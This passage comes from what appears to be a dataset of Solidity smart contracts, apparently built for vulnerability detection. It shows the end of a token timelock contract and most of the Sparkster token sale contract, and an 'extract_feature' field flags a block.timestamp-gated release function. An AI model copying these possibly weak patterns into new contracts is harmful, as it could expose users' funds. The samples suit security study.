revokeTokenTimelock(\n address _beneficiary,\n uint256 _id)\n external onlyWhenActivated onlyOwner onlyValidTokenTimelock(_beneficiary, _id)\n {\n require(tokenTimeLocks[_beneficiary][_id].revocable);\n require(!tokenTimeLocks[_beneficiary][_id].released);\n TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\n tokenLock.revoked = true;\n require(token.transfer(owner, tokenLock.amount));\n emit TokenTimelockRevoked(_beneficiary);\n }\n function getTokenTimelockCount(address _beneficiary) view external returns (uint) {\n return tokenTimeLocks[_beneficiary].length;\n }\n function getTokenTimelockDetails(address _beneficiary, uint256 _id) view external returns (\n uint256 _amount,\n uint256 _releaseTime,\n bool _released,\n bool _revocable,\n bool _revoked)\n {\n require(_id < tokenTimeLocks[_beneficiary].length);\n _amount = tokenTimeLocks[_beneficiary][_id].amount;\n _releaseTime = tokenTimeLocks[_beneficiary][_id].releaseTime;\n _released = tokenTimeLocks[_beneficiary][_id].released;\n _revocable = tokenTimeLocks[_beneficiary][_id].revocable;\n _revoked = tokenTimeLocks[_beneficiary][_id].revoked;\n }\n function changeBeneficiary(uint256 _id, address _newBeneficiary) external onlyWhenActivated onlyValidTokenTimelock(msg.sender, _id) {\n tokenTimeLocks[_newBeneficiary].push(tokenTimeLocks[msg.sender][_id]);\n if (tokenTimeLocks[msg.sender].length > 1) {\n tokenTimeLocks[msg.sender][_id] = tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)];\n delete(tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)]);\n }\n tokenTimeLocks[msg.sender].length--;\n emit TokenTimelockBeneficiaryChanged(msg.sender, _newBeneficiary);\n }\n function release(uint256 _id) external {\n releaseFor(msg.sender, _id);\n }\n function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {\n TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\n require(!tokenLock.released);\n require(block.timestamp >= tokenLock.releaseTime);\n tokenLock.released = true;\n require(token.transfer(_beneficiary, tokenLock.amount));\n emit TokenTimelockReleased(_beneficiary, tokenLock.amount);\n }\n}",
  "extract_feature": [
    "function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {\nTokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\nrequire(!tokenLock.released);\nrequire(block.timestamp >= tokenLock.releaseTime);\ntokenLock.released = true;\nrequire(token.transfer(_beneficiary, tokenLock.amount));\nemit TokenTimelockReleased(_beneficiary, tokenLock.amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f1a"
  },
  "filename": "6592.sol",
  "content": "pragma solidity 0.4.24;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint256 _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint256 _subtractedValue\n )\n public\n returns (bool)\n {\n uint256 oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\nlibrary strings {\n struct slice {\n uint _len;\n uint _ptr;\n }\n function memcpy(uint dest, uint src, uint len) private pure {\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n }\n function toSlice(string self) internal pure returns (slice) {\n uint ptr;\n assembly {\n ptr := add(self, 0x20)\n }\n return slice(bytes(self).length, ptr);\n }\n function len(bytes32 self) internal pure returns (uint) {\n uint ret;\n if (self == 0)\n return 0;\n if (self & 0xffffffffffffffffffffffffffffffff == 0) {\n ret += 16;\n self = bytes32(uint(self) / 0x100000000000000000000000000000000);\n }\n if (self & 0xffffffffffffffff == 0) {\n ret += 8;\n self = bytes32(uint(self) / 0x10000000000000000);\n }\n if (self & 0xffffffff == 0) {\n ret += 4;\n self = bytes32(uint(self) / 0x100000000);\n }\n if (self & 0xffff == 0) {\n ret += 2;\n self = bytes32(uint(self) / 0x10000);\n }\n if (self & 0xff == 0) {\n ret += 1;\n }\n return 32 - ret;\n }\n function toSliceB32(bytes32 self) internal pure returns (slice ret) {\n assembly {\n let ptr := mload(0x40)\n mstore(0x40, add(ptr, 0x20))\n mstore(ptr, self)\n mstore(add(ret, 0x20), ptr)\n }\n ret._len = len(self);\n }\n function copy(slice self) internal pure returns (slice) {\n return slice(self._len, self._ptr);\n }\n function toString(slice self) internal pure returns (string) {\n string memory ret = new string(self._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n return ret;\n }\n function len(slice self) internal pure returns (uint l) {\n uint ptr = self._ptr - 31;\n uint end = ptr + self._len;\n for (l = 0; ptr < end; l++) {\n uint8 b;\n assembly { b := and(mload(ptr), 0xFF) }\n if (b < 0x80) {\n ptr += 1;\n } else if(b < 0xE0) {\n ptr += 2;\n } else if(b < 0xF0) {\n ptr += 3;\n } else if(b < 0xF8) {\n ptr += 4;\n } else if(b < 0xFC) {\n ptr += 5;\n } else {\n ptr += 6;\n }\n }\n }\n function empty(slice self) internal pure returns (bool) {\n return self._len == 0;\n }\n function compare(slice self, slice other) internal pure returns (int) {\n uint shortest = self._len;\n if (other._len < self._len)\n shortest = other._len;\n uint selfptr = self._ptr;\n uint otherptr = other._ptr;\n for (uint idx = 0; idx < shortest; idx += 32) {\n uint a;\n uint b;\n assembly {\n a := mload(selfptr)\n b := mload(otherptr)\n }\n if (a != b) {\n uint256 mask = uint256(-1);\n if(shortest < 32) {\n mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\n }\n uint256 diff = (a & mask) - (b & mask);\n if (diff != 0)\n return int(diff);\n }\n selfptr += 32;\n otherptr += 32;\n }\n return int(self._len) - int(other._len);\n }\n function equals(slice self, slice other) internal pure returns (bool) {\n return compare(self, other) == 0;\n }\n function nextRune(slice self, slice rune) internal pure returns (slice) {\n rune._ptr = self._ptr;\n if (self._len == 0) {\n rune._len = 0;\n return rune;\n }\n uint l;\n uint b;\n assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\n if (b < 0x80) {\n l = 1;\n } else if(b < 0xE0) {\n l = 2;\n } else if(b < 0xF0) {\n l = 3;\n } else {\n l = 4;\n }\n if (l > self._len) {\n rune._len = self._len;\n self._ptr += self._len;\n self._len = 0;\n return rune;\n }\n self._ptr += l;\n self._len -= l;\n rune._len = l;\n return rune;\n }\n function nextRune(slice self) internal pure returns (slice ret) {\n nextRune(self, ret);\n }\n function ord(slice self) internal pure returns (uint ret) {\n if (self._len == 0) {\n return 0;\n }\n uint word;\n uint length;\n uint divisor = 2 ** 248;\n assembly { word:= mload(mload(add(self, 32))) }\n uint b = word / divisor;\n if (b < 0x80) {\n ret = b;\n length = 1;\n } else if(b < 0xE0) {\n ret = b & 0x1F;\n length = 2;\n } else if(b < 0xF0) {\n ret = b & 0x0F;\n length = 3;\n } else {\n ret = b & 0x07;\n length = 4;\n }\n if (length > self._len) {\n return 0;\n }\n for (uint i = 1; i < length; i++) {\n divisor = divisor / 256;\n b = (word / divisor) & 0xFF;\n if (b & 0xC0 != 0x80) {\n return 0;\n }\n ret = (ret * 64) | (b & 0x3F);\n }\n return ret;\n }\n function keccak(slice self) internal pure returns (bytes32 ret) {\n assembly {\n ret := keccak256(mload(add(self, 32)), mload(self))\n }\n }\n function startsWith(slice self, slice needle) internal pure returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n if (self._ptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let length := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n return equal;\n }\n function beyond(slice self, slice needle) internal pure returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n bool equal = true;\n if (self._ptr != needle._ptr) {\n assembly {\n let length := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, length), sha3(needleptr, length))\n }\n }\n if (equal) {\n self._len -= needle._len;\n self._ptr += needle._len;\n }\n return self;\n }\n function endsWith(slice self, slice needle) internal pure returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n uint selfptr = self._ptr + self._len - needle._len;\n if (selfptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let length := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n return equal;\n }\n function until(slice self, slice needle) internal pure returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n uint selfptr = self._ptr + self._len - needle._len;\n bool equal = true;\n if (selfptr != needle._ptr) {\n assembly {\n let length := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n }\n if (equal) {\n self._len -= needle._len;\n }\n return self;\n }\n event log_bytemask(bytes32 mask);\n function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n uint ptr = selfptr;\n uint idx;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n bytes32 needledata;\n assembly { needledata := and(mload(needleptr), mask) }\n uint end = selfptr + selflen - needlelen;\n bytes32 ptrdata;\n assembly { ptrdata := and(mload(ptr), mask) }\n while (ptrdata != needledata) {\n if (ptr >= end)\n return selfptr + selflen;\n ptr++;\n assembly { ptrdata := and(mload(ptr), mask) }\n }\n return ptr;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n for (idx = 0; idx <= selflen - needlelen; idx++) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr;\n ptr += 1;\n }\n }\n }\n return selfptr + selflen;\n }\n function rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n uint ptr;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n bytes32 needledata;\n assembly { needledata := and(mload(needleptr), mask) }\n ptr = selfptr + selflen - needlelen;\n bytes32 ptrdata;\n assembly { ptrdata := and(mload(ptr), mask) }\n while (ptrdata != needledata) {\n if (ptr <= selfptr)\n return selfptr;\n ptr--;\n assembly { ptrdata := and(mload(ptr), mask) }\n }\n return ptr + needlelen;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n ptr = selfptr + (selflen - needlelen);\n while (ptr >= selfptr) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr + needlelen;\n ptr -= 1;\n }\n }\n }\n return selfptr;\n }\n function find(slice self, slice needle) internal pure returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len -= ptr - self._ptr;\n self._ptr = ptr;\n return self;\n }\n function rfind(slice self, slice needle) internal pure returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len = ptr - self._ptr;\n return self;\n }\n function split(slice self, slice needle, slice token) internal pure returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = self._ptr;\n token._len = ptr - self._ptr;\n if (ptr == self._ptr + self._len) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n self._ptr = ptr + needle._len;\n }\n return token;\n }\n function split(slice self, slice needle) internal pure returns (slice token) {\n split(self, needle, token);\n }\n function rsplit(slice self, slice needle, slice token) internal pure returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = ptr;\n token._len = self._len - (ptr - self._ptr);\n if (ptr == self._ptr) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n }\n return token;\n }\n function rsplit(slice self, slice needle) internal pure returns (slice token) {\n rsplit(self, needle, token);\n }\n function count(slice self, slice needle) internal pure returns (uint cnt) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\n while (ptr <= self._ptr + self._len) {\n cnt++;\n ptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\n }\n }\n function contains(slice self, slice needle) internal pure returns (bool) {\n return rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr;\n }\n function concat(slice self, slice other) internal pure returns (string) {\n string memory ret = new string(self._len + other._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n memcpy(retptr + self._len, other._ptr, other._len);\n return ret;\n }\n function join(slice self, slice[] parts) internal pure returns (string) {\n if (parts.length == 0)\n return \"\";\n uint length = self._len * (parts.length - 1);\n for(uint i = 0; i < parts.length; i++)\n length += parts[i]._len;\n string memory ret = new string(length);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n for(i = 0; i < parts.length; i++) {\n memcpy(retptr, parts[i]._ptr, parts[i]._len);\n retptr += parts[i]._len;\n if (i < parts.length - 1) {\n memcpy(retptr, self._ptr, self._len);\n retptr += self._len;\n }\n }\n return ret;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\npragma solidity 0.4.24;\ncontract SparksterToken is StandardToken, Ownable{\n using strings for *;\n using SafeMath for uint256;\n struct Member {\n address walletAddress;\n mapping(uint256 => bool) groupMemberships;\n mapping(uint256 => uint256) ethBalance;\n mapping(uint256 => uint256) tokenBalance;\n uint256 max1;\n int256 transferred;\n bool exists;\n }\n struct Group {\n bool distributed;\n bool distributing;\n bool unlocked;\n uint256 groupNumber;\n uint256 ratio;\n uint256 startTime;\n uint256 phase1endTime;\n uint256 phase2endTime;\n uint256 deadline;\n uint256 max2;\n uint256 max3;\n uint256 ethTotal;\n uint256 cap;\n uint256 howManyDistributed;\n }\n bool internal transferLock = true;\n bool internal allowedToSell = false;\n bool internal allowedToPurchase = false;\n string public name;\n string public symbol;\n uint8 public decimals;\n uint256 internal maxGasPrice;\n uint256 internal nextGroupNumber;\n uint256 public sellPrice;\n address[] internal allMembers;\n address[] internal allNonMembers;\n mapping(address => bool) internal nonMemberTransfers;\n mapping(address => Member) internal members;\n mapping(uint256 => Group) internal groups;\n mapping(uint256 => address[]) internal associations;\n uint256 internal openGroupNumber;\n event PurchaseSuccess(address indexed _addr, uint256 _weiAmount,uint256 _totalEthBalance,uint256 _totalTokenBalance);\n event DistributeDone(uint256 groupNumber);\n event UnlockDone(uint256 groupNumber);\n event GroupCreated(uint256 groupNumber, uint256 startTime, uint256 phase1endTime, uint256 phase2endTime, uint256 deadline, uint256 phase2cap, uint256 phase3cap, uint256 cap, uint256 ratio);\n event ChangedAllowedToSell(bool allowedToSell);\n event ChangedAllowedToPurchase(bool allowedToPurchase);\n event ChangedTransferLock(bool transferLock);\n event SetSellPrice(uint256 sellPrice);\n event Added(address walletAddress, uint256 group, uint256 tokens, uint256 maxContribution1);\n event SplitTokens(uint256 splitFactor);\n event ReverseSplitTokens(uint256 splitFactor);\n modifier onlyPayloadSize(uint size) {\n require(msg.data.length == size + 4);\n _;\n }\n modifier canTransfer() {\n require(!transferLock);\n _;\n }\n modifier canPurchase() {\n require(allowedToPurchase);\n _;\n }\n modifier canSell() {\n require(allowedToSell);\n _;\n }\n function() public payable {\n purchase();\n }\n constructor() public {\n name = \"Sparkster\";\n decimals = 18;\n symbol = \"SPRK\";\n setMaximumGasPrice(40);\n mintTokens(435000000);\n }\n function setMaximumGasPrice(uint256 gweiPrice) public onlyOwner returns(bool success) {\n maxGasPrice = gweiPrice.mul(10**9);\n return true;\n }\n function parseAddr(string _a) pure internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function parseInt(string _a, uint _b) pure internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decim = false;\n for (uint i = 0; i < bresult.length; i++) {\n if ((bresult[i] >= 48) && (bresult[i] <= 57)) {\n if (decim) {\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decim = true;\n }\n return mint;\n }\n function mintTokens(uint256 amount) public onlyOwner {\n uint256 decimalAmount = amount.mul(uint(10)**decimals);\n totalSupply_ = totalSupply_.add(decimalAmount);\n balances[msg.sender] = balances[msg.sender].add(decimalAmount);\n emit Transfer(address(0), msg.sender, decimalAmount);\n }\n function purchase() public canPurchase payable{\n require(msg.sender != address(0));\n Member storage memberRecord = members[msg.sender];\n Group storage openGroup = groups[openGroupNumber];\n require(openGroup.ratio > 0);\n require(memberRecord.exists && memberRecord.groupMemberships[openGroup.groupNumber] && !openGroup.distributing && !openGroup.distributed && !openGroup.unlocked);\n uint256 currentTimestamp = block.timestamp;\n require(currentTimestamp >= openGroup.startTime && currentTimestamp <= openGroup.deadline);\n require(tx.gasprice <= maxGasPrice);\n uint256 weiAmount = msg.value;\n require(weiAmount >= 0.1 ether);\n uint256 ethTotal = openGroup.ethTotal.add(weiAmount);\n require(ethTotal <= openGroup.cap);\n uint256 userETHTotal = memberRecord.ethBalance[openGroup.groupNumber].add(weiAmount);\n if(currentTimestamp <= openGroup.phase1endTime){\n require(userETHTotal <= memberRecord.max1);\n } else if (currentTimestamp <= openGroup.phase2endTime) {\n require(userETHTotal <= openGroup.max2);\n } else {\n require(userETHTotal <= openGroup.max3);\n }\n uint256 tokenAmount = weiAmount.mul(openGroup.ratio);\n uint256 newLeftOver = balances[owner].sub(tokenAmount);\n openGroup.ethTotal = ethTotal;\n memberRecord.ethBalance[openGroup.groupNumber] = userETHTotal;\n memberRecord.tokenBalance[openGroup.groupNumber] = memberRecord.tokenBalance[openGroup.groupNumber].add(tokenAmount);\n balances[owner] = newLeftOver;\n owner.transfer(weiAmount);\n emit PurchaseSuccess(msg.sender,weiAmount,memberRecord.ethBalance[openGroup.groupNumber],memberRecord.tokenBalance[openGroup.groupNumber]);\n }\n function sell(uint256 amount) public canSell {\n uint256 decimalAmount = amount.mul(uint(10)**decimals);\n if (members[msg.sender].exists) {\n int256 sellValue = members[msg.sender].transferred + int(decimalAmount);\n require(sellValue >= members[msg.sender].transferred);\n require(sellValue <= int(getUnlockedBalanceLimit(msg.sender)));\n members[msg.sender].transferred = sellValue;\n }\n balances[msg.sender] = balances[msg.sender].sub(decimalAmount);\n uint256 totalCost = amount.mul(sellPrice);\n require(address(this).balance >= totalCost);\n balances[owner] = balances[owner].add(decimalAmount);\n msg.sender.transfer(totalCost);\n emit Transfer(msg.sender, owner, decimalAmount);\n }\n function fundContract() public onlyOwner payable {\n }\n function setSellPrice(uint256 thePrice) public onlyOwner {\n sellPrice = thePrice;\n emit SetSellPrice(sellPrice);\n }\n function setAllowedToSell(bool value) public onlyOwner {\n allowedToSell = value;\n emit ChangedAllowedToSell(allowedToSell);\n }\n function setAllowedToPurchase(bool value) public onlyOwner {\n allowedToPurchase = value;\n emit ChangedAllowedToPurchase(allowedToPurchase);\n }\n function createGroup(uint256 startEpoch, uint256 phase1endEpoch, uint256 phase2endEpoch, uint256 deadlineEpoch, uint256 phase2cap, uint256 phase3cap, uint256 etherCap, uint256 ratio) public onlyOwner returns (bool success, uint256 createdGroupNumber) {\n Group storage theGroup = groups[nextGroupNumber];\n theGroup.groupNumber = nextGroupNumber;\n theGroup.startTime = startEpoch;\n theGroup.phase1endTime = phase1endEpoch;\n theGroup.phase2endTime = phase2endEpoch;\n theGroup.deadline = deadlineEpoch;\n theGroup.max2 = phase2cap;\n theGroup.max3 = phase3cap;\n theGroup.cap = etherCap;\n theGroup.ratio = ratio;\n createdGroupNumber = nextGroupNumber;\n nextGroupNumber++;\n success = true;\n emit GroupCreated(createdGroupNumber, startEpoch, phase1endEpoch, phase2endEpoch, deadlineEpoch, phase2cap, phase3cap, etherCap, ratio);\n }\n function createGroup() public onlyOwner returns (bool success, uint256 createdGroupNumber) {\n return createGroup(0, 0, 0, 0, 0, 0, 0, 0);\n }\n function getGroup(uint256 groupNumber) public view onlyOwner returns(bool distributed, bool unlocked, uint256 phase2cap, uint256 phase3cap, uint256 cap, uint256 ratio, uint256 startTime, uint256 phase1endTime, uint256 phase2endTime, uint256 deadline, uint256 ethTotal, uint256 howManyDistributed) {\n require(groupNumber < nextGroupNumber);\n Group storage theGroup = groups[groupNumber];\n distributed = theGroup.distributed;\n unlocked = theGroup.unlocked;\n phase2cap = theGroup.max2;\n phase3cap = theGroup.max3;\n cap = theGroup.cap;\n ratio = theGroup.ratio;\n startTime = theGroup.startTime;\n phase1endTime = theGroup.phase1endTime;\n phase2endTime = theGroup.phase2endTime;\n deadline = theGroup.deadline;\n ethTotal = theGroup.ethTotal;\n howManyDistributed = theGroup.howManyDistributed;\n }\n function getHowManyLeftToDistribute(uint256 groupNumber) public view returns(uint256 howManyLeftToDistribute) {\n require(groupNumber < nextGroupNumber);\n Group storage theGroup = groups[groupNumber];\n howManyLeftToDistribute = associations[groupNumber].length - theGroup.howManyDistributed;\n }\n function getMembersInGroup(uint256 groupNumber) public view returns (address[]) {\n require(groupNumber < nextGroupNumber);\n return associations[groupNumber];\n }\n function addMember(address walletAddress, uint256 groupNumber, uint256 tokens, uint256 maxContribution1) public onlyOwner returns (bool success) {\n Member storage theMember = members[walletAddress];\n Group storage theGroup = groups[groupNumber];\n require(groupNumber < nextGroupNumber);\n require(!theGroup.distributed && !theGroup.distributing && !theGroup.unlocked);\n require(!theMember.exists);\n theMember.walletAddress = walletAddress;\n theMember.groupMemberships[groupNumber] = true;\n balances[owner] = balances[owner].sub(tokens);\n theMember.tokenBalance[groupNumber] = tokens;\n theMember.max1 = maxContribution1;\n theMember.transferred = -int(balances[walletAddress]);\n theMember.exists = true;\n associations[groupNumber].push(walletAddress);\n allMembers.push(walletAddress);\n emit Added(walletAddress, groupNumber, tokens, maxContribution1);\n return true;\n }\n function addMemberToGroup(address walletAddress, uint256 groupNumber) public onlyOwner returns(bool success) {\n Member storage memberRecord = members[walletAddress];\n require(memberRecord.exists && groupNumber < nextGroupNumber && !memberRecord.groupMemberships[groupNumber]);\n memberRecord.groupMemberships[groupNumber] = true;\n associations[groupNumber].push(walletAddress);\n return true;\n }\n function upload(string uploadedData) public onlyOwner returns (bool success) {\n strings.slice memory uploadedSlice = uploadedData.toSlice();\n strings.slice memory nextRecord = \"\".toSlice();\n strings.slice memory nextDatum = \"\".toSlice();\n strings.slice memory recordSeparator = \"|\".toSlice();\n strings.slice memory datumSeparator = \":\".toSlice();\n while (!uploadedSlice.empty()) {\n nextRecord = uploadedSlice.split(recordSeparator);\n nextDatum = nextRecord.split(datumSeparator);\n address memberAddress = parseAddr(nextDatum.toString());\n nextDatum = nextRecord.split(datumSeparator);\n uint256 memberGroup = parseInt(nextDatum.toString(), 0);\n nextDatum = nextRecord.split(datumSeparator);\n uint256 memberTokens = parseInt(nextDatum.toString(), 0);\n nextDatum = nextRecord.split(datumSeparator);\n uint256 memberMaxContribution1 = parseInt(nextDatum.toString(), 0);\n addMember(memberAddress, memberGroup, memberTokens, memberMaxContribution1);\n }\n return true;\n }\n function distribute(uint256 groupNumber, uint256 howMany) public onlyOwner returns (bool success) {\n Group storage theGroup = groups[groupNumber];\n require(groupNumber < nextGroupNumber && !theGroup.distributed );\n uint256 inclusiveStartIndex = theGroup.howManyDistributed;\n uint256 exclusiveEndIndex = inclusiveStartIndex.add(howMany);\n theGroup.distributing = true;\n uint256 n = associations[groupNumber].length;\n require(n > 0 );\n if (exclusiveEndIndex > n) {\n exclusiveEndIndex = n;\n }\n for (uint256 i = inclusiveStartIndex; i < exclusiveEndIndex; i++) {\n address memberAddress = associations[groupNumber][i];\n Member storage currentMember = members[memberAddress];\n uint256 balance = currentMember.tokenBalance[groupNumber];\n if (balance > 0) {\n balances[memberAddress] = balances[memberAddress].add(balance);\n emit Transfer(owner, memberAddress, balance);\n }\n theGroup.howManyDistributed++;\n }\n if (theGroup.howManyDistributed == n) {\n theGroup.distributed = true;\n theGroup.distributing = false;\n emit DistributeDone(groupNumber);\n }\n return true;\n }\n function getUnlockedBalanceLimit(address walletAddress) internal view returns(uint256 balance) {\n Member storage theMember = members[walletAddress];\n if (!theMember.exists) {\n return balances[walletAddress];\n }\n for (uint256 i = 0; i < nextGroupNumber; i++) {\n if (groups[i].unlocked) {\n balance = balance.add(theMember.tokenBalance[i]);\n }\n }\n return balance;\n }\n function getUnlockedTokens(address walletAddress) public view returns(uint256 balance) {\n Member storage theMember = members[walletAddress];\n if (!theMember.exists) {\n return balances[walletAddress];\n }\n return uint256(int(getUnlockedBalanceLimit(walletAddress)) - theMember.transferred);\n }\n function unlock(uint256 groupNumber) public onlyOwner returns (bool success) {\n Group storage theGroup = groups[groupNumber];\n require(theGroup.distributed && !theGroup.unlocked);\n theGroup.unlocked = true;\n emit UnlockDone(groupNumber);\n return true;\n }\n function setTransferLock(bool value) public onlyOwner {\n transferLock = value;\n emit ChangedTransferLock(transferLock);\n }\n function burn(uint256 amount) public onlyOwner {\n balances[msg.sender] = balances[msg.sender].sub(amount);\n totalSupply_ = totalSupply_.sub(amount);\n emit Transfer(msg.sender, address(0), amount);\n }\n function splitTokensBeforeDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n uint256 n = allMembers.length;\n uint256 ownerBalance = balances[msg.sender];\n uint256 increaseSupplyBy = ownerBalance.mul(splitFactor).sub(ownerBalance);\n balances[msg.sender] = balances[msg.sender].mul(splitFactor);\n totalSupply_ = totalSupply_.mul(splitFactor);\n emit Transfer(address(0), msg.sender, increaseSupplyBy);\n for (uint256 i = 0; i < n; i++) {\n Member storage currentMember = members[allMembers[i]];\n currentMember.transferred = currentMember.transferred * int(splitFactor);\n for (uint256 j = 0; j < nextGroupNumber; j++) {\n uint256 memberBalance = currentMember.tokenBalance[j];\n uint256 multiplier = memberBalance.mul(splitFactor);\n currentMember.tokenBalance[j] = multiplier;\n }\n }\n n = nextGroupNumber;\n 